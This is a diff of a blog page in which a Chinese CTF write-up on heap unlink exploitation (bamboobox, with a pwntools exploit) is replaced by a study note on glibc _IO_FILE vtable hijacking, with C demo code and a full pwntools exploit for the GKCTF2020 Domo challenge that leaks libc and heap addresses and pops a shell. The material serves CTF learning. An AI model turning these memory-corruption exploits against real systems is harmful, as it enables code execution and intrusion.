@@ -165,7 +165,7 @@
                     <article class="post-wrap">
                         <header class="post-header">
                             <h1 class="post-title">
-                                unlink利用—hitcontraining_unlink
+                                IO_FILE学习
                             </h1>
                             
                                 <!--en-->
@@ -175,22 +175,13 @@
                                         lemon的自留地～
                                     </a>
                                     <span class="post-time">
-                                Date: <a href="#">2020-09-05</a>
+                                Date: <a href="#">2020-09-20</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">3.2
+                                    href="#">6.3
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">653</a></span>
+                                    <span class="post-words">words:<a href="#">1426</a></span>
                                     
-                                        <span class="post-category">
-                                Category:
-                                
-                                <a href="https://l3mon629.github.io/tag/tc2bM4krw/">heap</a>
-                                
-                                <a href="https://l3mon629.github.io/tag/mizqxcXow6/">unlink</a>
-                                
-                            </span>
-                                        
                                             Views:
                                             <span data-hk-page="current"> - </span>
                                             
@@ -199,118 +190,231 @@
                         </header>
                         
                         <div class="post-content">
-                            <h1 id="unlink">unlink</h1>
-<p>简单说一下吧，不说太多了，比较累了<br>
-总结一下<br>
-(只讨论2.23版本的libc下的unlink)</p>
-<h2 id="利用条件">利用条件</h2>
-<p>一个指向heap的指针，在bss段上之类的，最好没开pie，就比较轻松点儿<br>
-然后还需要堆溢出或者UAF，目的都是改写smallbin 或是 unsorted bin 的 fd 和 bk 指针</p>
-<h2 id="效果">效果</h2>
-<p>使得已指向chunk 的指针 ptr 变为 ptr - 0x18</p>
-<h2 id="通用思路">通用思路</h2>
-<p>设指向可 UAF chunk 的指针的地址为 ptr<br>
-修改 fd 为 ptr - 0x18<br>
-修改 bk 为 ptr - 0x10<br>
-触发 unlink</p>
-<p>更详细的思路：<br>
-以能够进行堆溢出的场景下说明：<br>
-1，申请三个堆块012，0用来溢出，1用来作为unsorted bin，2用来保护<br>
-2，伪造chunk0，伪造fd和bk之类的，然后利用堆溢出来改写chunk1的prevsize和size的inuse<br>
-3，free1，触发unlink<br>
-4，找bss段上的全局指针，看看周围怎么利用，比如改got表</p>
-<h1 id="解题">解题</h1>
-<h2 id="逆向">逆向</h2>
-<p>不看了，简单逆向，漏洞位于在edit中，可以任意修改长度，老漏洞了<br>
-思路，伪造chunk，然后unlink到bss处，改写heaparray到free@got，然后修改为system<br>
-下图为atoi，一开始是修改atoi为system，然后输入sh拿到shell，本地可以打通，但是远程就不行了，qswl<br>
-还有libcsearcher，我的libcsearcher像坨屎一样误差就nima离谱，草<br>
-<img src="https://l3mon629.github.io/post-images/1599298739106.png" alt="" loading="lazy"><br>
-<img src="https://l3mon629.github.io/post-images/1599298744916.png" alt="" loading="lazy"></p>
-<h2 id="exp">exp</h2>
-<pre><code class="language-python">from pwn import *
-from LibcSearcher import *
-#r=process('bamboobox')
-#r=remote('node3.buuoj.cn',28011)
-elf=ELF('../hitcontraining_unlink/bamboobox')
-r = process('../hitcontraining_unlink/bamboobox')
-
-def alloc(length,context):
-    r.recvuntil(&quot;Your choice:&quot;)
-    r.sendline(&quot;2&quot;)
-    r.recvuntil(&quot;Please enter the length of item name:&quot;)
-    r.sendline(str(length))
-    r.recvuntil(&quot;Please enter the name of item:&quot;)
-    r.send(context)
-
-def edit(idx,length,context):
-    r.recvuntil(&quot;Your choice:&quot;)
-    r.sendline(&quot;3&quot;)
-    r.recvuntil(&quot;Please enter the index of item:&quot;)
-    r.sendline(str(idx))
-    r.recvuntil(&quot;Please enter the length of item name:&quot;)
-    r.sendline(str(length))
-    r.recvuntil(&quot;Please enter the new name of the item:&quot;)
-    r.send(context)
-
-def free(idx):
-    r.recvuntil(&quot;Your choice:&quot;)
-    r.sendline(&quot;4&quot;)
-    r.recvuntil(&quot;Please enter the index of item:&quot;)
-    r.sendline(str(idx))
-
-def show():
-    r.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;)
-
-alloc(0x30,'bbbb')
-alloc(0x30,'bbbb')
-alloc(0x80,'cccc')
-alloc(0x20,'/bin/sh\x00')
-
-glo=0x6020c8+0x10
-fd=glo-0x18
-bk=glo-0x10
-
-payload=p64(0)+p64(0x31)+p64(fd)+p64(bk)+b'a'*0x10+p64(0x30)+p64(0x90)
-edit(1,len(payload),payload)
-free(2)
-free_got=elf.got['free']
-log.info(&quot;free_got:%x&quot;,free_got)
-payload1=p64(0)+p64(0)+p64(0x30)+p64(free_got)
-#print payload1
-edit(1,len(payload),payload1)
-show()
-#log.info(&quot;got:%s&quot;,r.recv())
-
-free_addr=u64(r.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8, b'\x00'))
-log.info(&quot;free_addr:%x&quot;,free_addr)
-libc=LibcSearcher('free',free_addr)
-libc_base=free_addr-libc.dump('free')
-log.info(&quot;libc_addr:%x&quot;,libc_base)
-system_addr=libc_base+libc.dump('system')
-log.info(&quot;system_addr:%x&quot;,system_addr)
-edit(1,0x8,p64(system_addr))
-pause()
-free(3)
-r.interactive()
+                            <h2 id="复习说明">复习说明</h2>
+<p>_IO_FILE_plus 结构体：最全面的结构体</p>
+<pre><code>extern struct _IO_FILE_plus *_IO_list_all;
 </code></pre>
-<p>被环境恶心死了，本地的cccc</p>
+<p>_IO_list_all：_IO_FILE_plus类型的一个指针</p>
+<pre><code class="language-c">struct _IO_FILE_plus
+{
+  _IO_FILE file;
+  const struct _IO_jump_t *vtable;
+};
+</code></pre>
+<p>结构体 _IO_FILE_plus ，它有两部分组成。</p>
+<blockquote>
+<p>在第一部分， file 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。file结构在程序执行，fread、fwrite 等标准函数需要文件流指针来指引去调用虚表函数。<br>
+特殊地， fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 file结构的指针来接收这个返回值。</p>
+</blockquote>
+<p>_IO_jump_t:<br>
+<img src="https://l3mon629.github.io/post-images/1600587661100.png" alt="" loading="lazy"></p>
+<blockquote>
+<p>在第二部分，刚刚谈到的虚表就是 _IO_jump_t 结构体，在此虚表中，有很多函数都调用其中的子函数，无论是关闭文件，还是报错输出等等，都有对应的字段，而这正是可以攻击者可以被利用的突破口。<br>
+值得注意的是，在 _IO_list_all 结构体中，_IO_FILE 结构是完整嵌入其中，而 vtable 是一个虚表指针，它指向了 _IO_jump_t 结构体。一个是完整的，一个是指针，这点一定要切记。</p>
+</blockquote>
+<p>反正大致是这么个流程就对了<br>
+<img src="https://l3mon629.github.io/post-images/1600588419695.png" alt="" loading="lazy"></p>
+<h2 id="利用方法">利用方法</h2>
+<blockquote>
+<p>伪造 vtable 劫持程序流程的中心思想就是针对_IO_FILE_plus 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中布置函数指针来实现。<br>
+因此 vtable 劫持分为两种，一种是直接改写 vtable 中的函数指针，通过任意地址写就可以实现。另一种是覆盖 vtable 的指针指向我们控制的内存，然后在其中布置函数指针。</p>
+</blockquote>
+<p>ctf-wiki上的例子：</p>
+<pre><code class="language-c">int main(void)
+{
+    FILE *fp;
+    long long *vtable_ptr;
+    fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;);
+    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable
+
+    vtable_ptr[7]=0x41414141 //xsputn
+
+    printf(&quot;call 0x41414141&quot;);
+}
+</code></pre>
+<p>不过在目前 libc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入的。<br>
+经过调试发现确实无法进行写入。<br>
+<img src="https://l3mon629.github.io/post-images/1600737217908.png" alt="" loading="lazy"></p>
+<p>但是我们可以换一种利用思路，即伪造vtable的形式来利用</p>
+<pre><code class="language-c">
+
+#define system_ptr 0x7ffff7a52390;
+
+int main(void)
+{
+    FILE *fp;
+    long long *vtable_addr,*fake_vtable;
+
+    fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;);
+    fake_vtable=malloc(0x40);
+
+    vtable_addr=(long long *)((long long)fp+0xd8);     //vtable offset
+
+    vtable_addr[0]=(long long)fake_vtable;
+
+    memcpy(fp,&quot;sh&quot;,3);
+
+    fake_vtable[7]=system_ptr; //xsputn
+
+    fwrite(&quot;hi&quot;,2,1,fp);
+}
+</code></pre>
+<blockquote>
+<p>原理：vtable 中的函数调用时会把对应的_IO_FILE_plus 指针作为第一个参数传递，因此这里我们把 &quot;sh&quot; 写入_IO_FILE_plus 头部(即fp)。之后对 fwrite 的调用就会经过我们伪造的 vtable 执行 system(&quot;sh&quot;)。<br>
+如果程序中不存在 fopen 等函数创建的_IO_FILE 时，也可以选择 stdin\stdout\stderr 等位于 libc.so 中的_IO_FILE，这些流在 printf\scanf 等函数中就会被使用到。在 libc2.23 之前，这些 vtable 是可以写入并且不存在其他检测的。</p>
+</blockquote>
+<p>一些思路：<br>
+程序调用exit时，会遍历_IO_list_all，用 <em>IO_2_1_stdout</em> 下的 vatable 中 _setbuf 函数。</p>
+<h2 id="例题">例题</h2>
+<h3 id="gkctf2020domo">[GKCTF2020]Domo</h3>
+<h4 id="分析和思路">分析和思路</h4>
+<blockquote>
+<p>main函数<br>
+<img src="https://l3mon629.github.io/post-images/1600927602779.png" alt="" loading="lazy"><br>
+add 函数，发现我们可以申请九个chunk，并且题目给我们加了一个对hook函数的检查，发现申请的时候有个off-by-null，比如当我们申请的块为0x18时，下一个chunk的size为的最后一个字节会被我们覆盖为0<br>
+<img src="https://l3mon629.github.io/post-images/1600927701106.png" alt="" loading="lazy"><br>
+edit 函数，我们可以修改任意一个地址的一个字节内容，但是edit函数只能使用一次<br>
+<img src="https://l3mon629.github.io/post-images/1600927860325.png" alt="" loading="lazy"><br>
+还有show函数和delete函数，在此不作赘述</p>
+</blockquote>
+<p>思路：<br>
+第一步：泄漏地址，我们可以申请unsorted bin的大小来leak libc的地址，可以利用fastbin大小的chunk来leak heap段的地址<br>
+第二步：利用 off by null来构造重叠的chunk，向前unlink，布置一个fake chunk，然后申请一个big chunk获得一个chunk的控制能力后利用fastbin attack可以获得一个合适地址写的能力<br>
+第三步：攻击_IO_2_1_stdin_的vtable指针，在附近构造一个fastbin chunk并在heap段上伪造一个fake _IO_file_jumps，然后填入gadget，利用可写能力将vtable的值修改到fake _IO_file_jumps，从而getshell</p>
+<p>注意事项：<br>
+1，leak heap address是为了能够在unlink的时候伪造fd和bk绕过检查，并且在后续中改写vtable的时候利用<br>
+2，注意unlink的检查<br>
+3，用这个思路解题的过程中并没有用到edit功能<br>
+exp:</p>
+<pre><code class="language-python">from pwn import *
+
+local = 1  
+if local == 1:
+    p = process('./domo')
+else:
+    p = remote('node3.buuoj.cn',29623)
+
+context.terminal = ['tmux','splitw','-h']
+
+def dbg():
+    context.log_level = 'debug'
+
+def add(size,content):
+    p.sendlineafter('&gt;','1')
+    p.sendlineafter('size:',str(size))
+    p.sendafter('content:',content)
+
+def delete(index):
+    p.sendlineafter('&gt;','2')
+    p.sendlineafter('index:',str(index))
+
+def show(index):
+    p.sendlineafter('&gt;','3')
+    p.sendlineafter('index:',str(index))
+
+def edit(addr,num):
+    p.sendlineafter('&gt;','4')
+    p.sendlineafter('addr:',str(addr))
+    p.sendafter('num:',num)
+
+#dbg()
+
+libc = ELF('./libc-2.23.so')
+
+print &quot;============= step 1: leak libc and heap addr =================&quot;
+
+add(0x80,'aaaaaaaa')    #chunk0
+add(0x10,'protect')     #chunk1
+
+delete(0)
+
+add(0x80,'\x78')    #chunk0
+#dbg()
+show(0)
+libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 88 - 0x10 - libc.sym['__malloc_hook']
+print &quot;[*] libc base:&quot; + hex(libc_base)
+
+add(0x20,'A')   #chunk2
+add(0x20,'B')   #chunk3
+
+delete(2)
+delete(3)
+
+add(0x20,'a')   #chunk2
+show(2)
+heap_addr = u64(p.recvuntil('\x55')[-6:].ljust(8,'\x00')) - 0x1061
+print &quot;[*] heap address: &quot; + hex(heap_addr)
+
+
+print &quot;=================== step 2: off by null to overlap =================&quot;
+
+offset_heap_chunk3 = 0x1120
+fake_chunk = heap_addr + offset_heap_chunk3
+payload = p64(0) + p64(0xb1) + p64(fake_chunk+0x18) + p64(fake_chunk+0x20) + p64(fake_chunk+0x10)
+
+add(0x40,payload)   #chunk3
+add(0x68,'a')       #chunk4
+add(0xf0,'b')   #chunk5
+
+delete(4)
+
+print &quot;====== to use off by null ======&quot;
+add(0x68,0x60 * '\x00' + p64(0xb0))     #chunk4
+
+print &quot;===== unlink to overlap =====&quot;
+delete(5)
+
+
+add(0xc0,'a')   #chunk5
+add(0x60,'b')   #chunk6
+
+delete(6)
+delete(4)
+delete(5)
+
+#gdb.attach(p)
+
+print &quot;============ step 3: to make fake fake_vtable to get shell ================&quot;
+_IO_2_1_stdin_ = libc_base + libc.sym['_IO_2_1_stdin_']
+_IO_file_jumps = libc_base + libc.sym['_IO_file_jumps']
+
+fake_chunk = _IO_2_1_stdin_ + 160 - 3
+
+payload = '\x00' * 0x38 + p64(0x71) + p64(fake_chunk)
+add(0xc0,payload)   #chunk5
+
+one_gadget = libc_base + 0xf02a4
+add(0xa8,p64(0) * 2 + p64(one_gadget) * 19)
+
+fake_vtable = heap_addr + 0x1270
+payload = '\x00' * 3 + p64(0) + p64(0) + p64(0) + p64(0) * 2 + p64(fake_vtable)
+
+add(0x60,'a')
+#gdb.attach(p)
+add(0x60,payload)
+
+#gdb.attach(p)
+
+p.interactive()
+</code></pre>
 
                         </div>
                         
                             <div class="post-toc">
                                 <ul class="markdownIt-TOC">
-<li><a href="#unlink">unlink</a>
+<li>
 <ul>
-<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6">利用条件</a></li>
-<li><a href="#%E6%95%88%E6%9E%9C">效果</a></li>
-<li><a href="#%E9%80%9A%E7%94%A8%E6%80%9D%E8%B7%AF">通用思路</a></li>
+<li><a href="#%E5%A4%8D%E4%B9%A0%E8%AF%B4%E6%98%8E">复习说明</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95">利用方法</a></li>
+<li><a href="#%E4%BE%8B%E9%A2%98">例题</a>
+<ul>
+<li><a href="#gkctf2020domo">[GKCTF2020]Domo</a>
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90%E5%92%8C%E6%80%9D%E8%B7%AF">分析和思路</a></li>
 </ul>
 </li>
-<li><a href="#%E8%A7%A3%E9%A2%98">解题</a>
-<ul>
-<li><a href="#%E9%80%86%E5%90%91">逆向</a></li>
-<li><a href="#exp">exp</a></li>
+</ul>
+</li>
 </ul>
 </li>
 </ul>
@@ -328,7 +432,7 @@ r.interactive()
 
                                             <p class="copyright-item">
                                                 <span>Permalink:</span>
-                                                <span><a href="https://l3mon629.github.io/post/unlink-li-yong-hitcontraining_unlink/">https://l3mon629.github.io/post/unlink-li-yong-hitcontraining_unlink/</a></span>
+                                                <span><a href="https://l3mon629.github.io/post/io_file-xue-xi/">https://l3mon629.github.io/post/io_file-xue-xi/</a></span>
                                             </p>
 
                                             <p class="copyright-item">
@@ -343,9 +447,9 @@ r.interactive()
                                                         <span style="margin-right:15px">
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
-                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/unlink-li-yong-hitcontraining_unlink/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/unlink-li-yong-hitcontraining_unlink/&sharesource=qzone&title=unlink利用—hitcontraining_unlink&pics=https://l3mon629.github.io/images/avatar.png?v=1600933861949&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/unlink-li-yong-hitcontraining_unlink/&sharesource=weibo&title=unlink利用—hitcontraining_unlink + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1600933861949 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/io_file-xue-xi/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/io_file-xue-xi/&sharesource=qzone&title=IO_FILE学习&pics=https://l3mon629.github.io/images/avatar.png?v=1600933861949&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/io_file-xue-xi/&sharesource=weibo&title=IO_FILE学习 + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1600933861949 "><i class="fa fa-weibo "></i></a>
                                                         
                                                                 </span>
                                                                 <!--en-->
@@ -354,16 +458,6 @@ r.interactive()
                                                                         <span>Tag(s):</span>
                                                                         <span class="tag ">
                         
-                        
-                        <a href="https://l3mon629.github.io/tag/tc2bM4krw/">#
-                                                heap
-                                                    </a>
-                                                    
-                        <a href="https://l3mon629.github.io/tag/mizqxcXow6/">#
-                                                unlink
-                                                    </a>
-                                                    
-                                                        
                                                             </span>
                                                                     </div>
                                                                     <div>
@@ -376,13 +470,13 @@ r.interactive()
                                                                                 <!---->
                                                                                 <section class="post-nav">
                                                                                     
-                                                                                        <a class="prev" rel="prev" href="https://l3mon629.github.io/post/ctfwiki-unlink-2014-hitcon-stkof/">
-                                                                                            ctfwiki-unlink—2014 HITCON stkof
+                                                                                        <a class="prev" rel="prev" href="https://l3mon629.github.io/post/vim-bian-ji-qi/">
+                                                                                            vim编辑器
                                                                                         </a>
                                                                                         
                                                                                             
-                                                                                                <a class="next" rel="next" href="https://l3mon629.github.io/post/gyctf_2020_some_thing_exceting/">
-                                                                                                    gyctf_2020_some_thing_exceting
+                                                                                                <a class="next" rel="next" href="https://l3mon629.github.io/post/ubuntu18-zhong-de-off-by-one/">
+                                                                                                    ubuntu18中的off-by-one
                                                                                                 </a>
                                                                                                 
                                                                                 </section>
